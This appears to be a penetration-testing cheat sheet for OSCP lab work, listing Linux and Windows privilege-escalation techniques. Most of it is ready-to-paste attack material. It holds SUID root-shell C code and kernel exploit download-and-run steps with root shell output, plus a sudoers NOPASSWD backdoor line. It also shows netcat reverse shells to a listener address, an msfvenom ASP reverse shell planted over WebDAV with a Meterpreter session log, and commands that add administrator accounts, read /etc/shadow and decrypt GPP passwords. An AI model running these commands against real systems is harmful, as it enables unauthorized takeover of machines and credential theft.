*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*


-   Linux Privilege Escalation
    ------------------------------------------------------------------------------------------------------------------------

-   Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
    [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

-   Try the obvious - Maybe the user can sudo to root:  
    
    `sudo su`
    
-   Here are the commands I have learned to use to perform linux enumeration and privledge escalation:

    What services are running as root?:
    
    `ps aux | grep root`
    
    What files run as root / SUID / GUID?:

         find / -perm +2000 -user root -type f -print
         find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
         find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
         find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
         find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
         for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
         find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

    What folders are world writeable?:
    
         find / -writable -type d 2>/dev/null      # world-writeable folders
         find / -perm -222 -type d 2>/dev/null     # world-writeable folders
         find / -perm -o w -type d 2>/dev/null     # world-writeable folders
         find / -perm -o x -type d 2>/dev/null     # world-executable folders
         find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
    
-   There are a few scripts that can automate the linux enumeration process:

      - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.

      - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - 
      
         [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)

      - LinEnum - (Recently Updated)
      
      [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
      
      - linux-exploit-suggester (Recently Updated)
      
      [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
      
      -   Highon.coffee Linux Local Enum - Great enumeration script!
      
          `wget https://highon.coffee/downloads/linux-local-enum.sh`

      -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
      
    [https://github.com/PenturaLabs/Linux\_Exploit\_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)

      -   Linux post exploitation enumeration and exploit checking tools  
      
    [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
    

Handy Kernel Exploits

-   CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)

    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
    
         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
         $ ./i-can-haz-modharden
         [+] launching root shell!
         # id
         uid=0(root) gid=0(root)

-   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
    [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)

-   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
    [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
    Linux CVE 2012-0056  
    
          wget -O exploit.c http://www.exploit-db.com/download/18411 
          gcc -o mempodipper exploit.c  
          ./mempodipper

-   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
    [https://dirtycow.ninja/](https://dirtycow.ninja/)  
    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  

-   Run a command as a user other than root  

          sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf

-   Add a user or change a password

          /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
          echo thePassword | passwd haxzor --stdin

-   Local Privilege Escalation Exploit in Linux

    -   **SUID** (**S**et owner **U**ser **ID** up on execution)  
        Often SUID C binary files are required to spawn a shell as a
        superuser, you can update the UID / GID and shell as required.  
          
        below are some quick copy and paste examples for various
        shells:  
     
              SUID C Shell for /bin/bash  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/bash");  
              }  

              SUID C Shell for /bin/sh  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/sh");  
              }  

              Building the SUID Shell binary  
              gcc -o suid suid.c  
              For 32 bit:  
              gcc -m32 -o suid suid.c

    -   Create and compile an SUID from a limited shell (no file transfer)  
        
              echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
              gcc privsc.c -o privsc

-   Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:

    `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
    
-   You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable
    to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on 
    port 4444.
    
         set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
         echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
         chmod +x ssh

-   SearchSploit  

              searchsploit �uncsearchsploit apache 2.2  
              searchsploit "Linux Kernel"  
              searchsploit linux 2.6 | grep -i ubuntu | grep local  
              searchsploit slmail

 -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
 
     `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`

-   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***

    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    

-   Collect root password

    `cat /etc/shadow |grep root`
    
-   Find and display the proof.txt or flag.txt - LOOT!

            cat `find / -name proof.txt -print`

-   Windows Privilege Escalation
    --------------------------------------------------------------------------------------------------------------------------

-   Windows Privilege Escalation resource
    http://www.fuzzysecurity.com/tutorials/16.html

-   Try the getsystem command using meterpreter - rarely works but is worth a try.

    `meterpreter > getsystem`

-   Metasploit Meterpreter Privilege Escalation Guide
    https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

-   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

         cadavar http://$ip
         dav:/> put aspshell.txt
         Uploading aspshell.txt to `/aspshell.txt':
         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
         dav:/> copy aspshell.txt aspshell3.asp;.txt
         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
         dav:/> exit

         msf > use exploit/multi/handler
         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
         msf exploit(handler) > set LHOST 1.2.3.4
         msf exploit(handler) > set LPORT 80
         msf exploit(handler) > set ExitOnSession false
         msf exploit(handler) > exploit -j

         curl http://$ip/aspshell3.asp;.txt

         [*] Started reverse TCP handler on 1.2.3.4:443 
         [*] Starting the payload handler...
         [*] Sending stage (957487 bytes) to 1.2.3.5
         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

-   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

         pip install pyinstaller
         wget -O exploit.py http://www.exploit-db.com/download/31853  
         python pyinstaller.py --onefile exploit.py

-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 

      https://www.exploit-db.com/exploits/6705/
   
      https://github.com/Re4son/Churrasco
      
         c:\Inetpub>churrasco
         churrasco
         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

         c:\Inetpub>churrasco -d "net user /add <username> <password>"
         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
    
          python pyinstaller.py --onefile ms11-080.py  
          mx11-080.exe -O XP
    
-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

      MS16-032 https://www.exploit-db.com/exploits/39719/
      
      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
      
    
-   Powershell Priv Escalation Tools
    https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

      -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

               PsExec v2.2 - Execute processes remotely
               Copyright (C) 2001-2016 Mark Russinovich
               Sysinternals - www.sysinternals.com

      -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
               Enter the password for Test:
               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

      -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

               $username = '<username here>'
               $password = '<password here>'
               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

             Next run this script using powershell.exe:

             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


-   Windows Service Configuration Viewer - Check for misconfigurations
    in services that can lead to privilege escalation. You can replace
    the executable with your own and have windows execute whatever code
    you want as the privileged user.  
    icacls scsiaccess.exe

         scsiaccess.exe  
         NT AUTHORITY\SYSTEM:(I)(F)  
         BUILTIN\Administrators:(I)(F)  
         BUILTIN\Users:(I)(RX)  
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
         Everyone:(I)(F)

-   Compile a custom add user command in windows using C  

             root@kali:~\# cat useradd.c  
             #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
             int main ()  
             {  
             int i;  
             i=system ("net localgroup administrators low /add");  
             return 0;  
             }  

             i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

-   Group Policy Preferences (GPP)  
    A common useful misconfiguration found in modern domain environments
    is unprotected Windows GPP settings files

    -   map the Domain controller SYSVOL share  
        
        `net use z:\\dc01\SYSVOL`

    -   Find the GPP file: Groups.xml  
        
        `dir /s Groups.xml`

    -   Review the contents for passwords  
        
        `type Groups.xml`

    -   Decrypt using GPP Decrypt  
        
        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
        
-   Find and display the proof.txt or flag.txt - get the loot!
    
    `#meterpreter  >     run  post/windows/gather/win_privs`
    `cd\ & dir /b /s proof.txt`
    `type c:\pathto\proof.txt`